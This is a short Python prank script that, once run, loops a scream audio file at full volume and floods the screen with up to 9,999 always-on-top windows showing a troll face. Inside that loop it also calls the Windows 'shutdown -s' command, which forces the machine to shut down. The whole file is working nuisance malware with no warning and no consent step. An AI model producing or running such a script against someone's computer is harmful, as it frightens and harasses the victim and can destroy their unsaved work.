import os
import subprocess
import pygame
import subprocess
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
messagebox.showinfo(title='Little Surprise!', message='Surprise!!!!')
ruta_base=os.path.dirname(os.path.abspath(__file__))
pygame.init()
pygame.mixer.init()
pygame.mixer.music.load(os.path.join(ruta_base, "grito_screamer.mp3"))
pygame.mixer.music.play(-1)
pygame.mixer.music.set_volume(1)
ventana = tk.Tk()
ventana.title("TROLLLLLLLLLLL")
ventana.resizable(width=False,height=False)
imagen=Image.open(os.path.join(ruta_base, 'Trollface.png'))
imagen_tk = ImageTk.PhotoImage(imagen)
etiqueta_imagen = tk.Label(ventana, image=imagen_tk)
etiqueta_imagen.pack()
for i in range(0,9999):
    ventana.iconify()
    ventana_troll=tk.Toplevel(ventana)
    ventana_troll.title("TROLLLLLLLLLLL")
    ventana_troll.resizable(width=False,height=False)
    ventana_troll.attributes("-topmost", True)
    segunda_etiqueta=tk.Label(ventana_troll,image=imagen_tk)
    segunda_etiqueta.pack()
    subprocess.run("shutdown -s")
ventana.mainloop()